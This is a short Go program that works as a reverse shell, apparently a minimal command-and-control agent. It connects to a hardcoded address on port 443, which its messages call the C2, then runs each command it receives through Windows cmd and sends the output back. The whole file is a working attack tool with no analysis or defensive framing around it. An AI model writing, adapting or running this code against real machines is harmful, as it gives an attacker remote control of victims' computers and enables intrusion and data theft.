package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"strings"
)

func main() {
	conn, err := net.Dial("tcp", "192.168.0.17:443")
	if err != nil {
		fmt.Println("[-] Failed to connect to C2:", err)
		return
	}
	defer conn.Close()
	fmt.Println("[*] Connected to C2")

	for {
		cmdReader := bufio.NewReader(conn)
		cmd, err := cmdReader.ReadString('\n')
		if err != nil {
			fmt.Println("[-] Failed to read from C2:", err)
			return
		}
		cmd = strings.TrimSpace(cmd)
		out, err := exec.Command("cmd", "/C", cmd).CombinedOutput()
		if err != nil {
			out = append(out, []byte("\n[!] Command error: "+err.Error())...)
		}
		conn.Write(out)
	}
}
